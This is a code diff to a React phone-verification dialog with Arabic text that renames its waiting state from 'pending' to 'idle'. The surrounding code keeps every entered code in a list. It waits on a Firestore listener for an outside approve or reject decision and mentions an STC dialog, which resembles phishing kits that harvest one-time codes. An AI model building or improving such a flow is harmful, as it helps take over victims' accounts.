@@ -21,14 +21,14 @@ interface PhoneOtpDialogProps {
 export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, onSubmitted }: PhoneOtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
-  const [phoneOtpApproved, setOtpStatus] = useState<"pending" | "pending" | "approved" | "rejected">("pending")
+  const [phoneOtpApproved, setOtpStatus] = useState<"idle" | "pending" | "approved" | "rejected">("idle")
   const [error, setError] = useState("")
   const inputRef = useRef<HTMLInputElement | null>(null)
   const allOtps = useRef<string[]>([])
 
   // Timer countdown
   useEffect(() => {
-    if (open && timer > 0 && phoneOtpApproved === "pending") {
+    if (open && timer > 0 && phoneOtpApproved === "idle") {
       const interval = setInterval(() => {
         setTimer((prev) => prev - 1)
       }, 1000)
@@ -41,7 +41,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
     if (open) {
       setTimer(60)
       setOtp("")
-      setOtpStatus("pending")
+      setOtpStatus("idle")
       setError("")
       allOtps.current = []
       inputRef.current?.focus()
@@ -81,7 +81,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
             }, 1000)
           } else if (status === "rejected") {
             console.log("[PhoneOTP] OTP rejected")
-            setOtpStatus("pending") // Reset to pending instead of rejected
+            setOtpStatus("idle") // Re-enable input so the user can retry
             setOtp("") // Clear the old code
             setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
             onRejected() // Notify parent (e.g. close STC dialog, keep OTP open)
@@ -98,7 +98,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
       (err) => {
         console.error("[PhoneOTP] Firestore listener error:", err)
         setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
-        setOtpStatus("pending")
+        setOtpStatus("idle")
       }
     )
 
@@ -146,7 +146,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
     } catch (err) {
       console.error("[PhoneOTP] Error submitting OTP:", err)
       setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
-      setOtpStatus("pending")
+      setOtpStatus("idle")
     }
   }
 
@@ -155,7 +155,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
     setTimer(60)
     setOtp("")
     setError("")
-    setOtpStatus("pending")
+    setOtpStatus("idle")
     inputRef.current?.focus()
   }
 
@@ -226,11 +226,11 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected, on
 
           {/* Timer / Resend */}
           <div className="text-center">
-            {timer > 0 && phoneOtpApproved === "pending" ? (
+            {timer > 0 && phoneOtpApproved === "idle" ? (
               <p className="text-sm text-gray-600">
                 إعادة إرسال الرمز بعد <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
               </p>
-            ) : phoneOtpApproved === "pending" ? (
+            ) : phoneOtpApproved === "idle" ? (
               <Button 
                 variant="link" 
                 onClick={handleResend} 
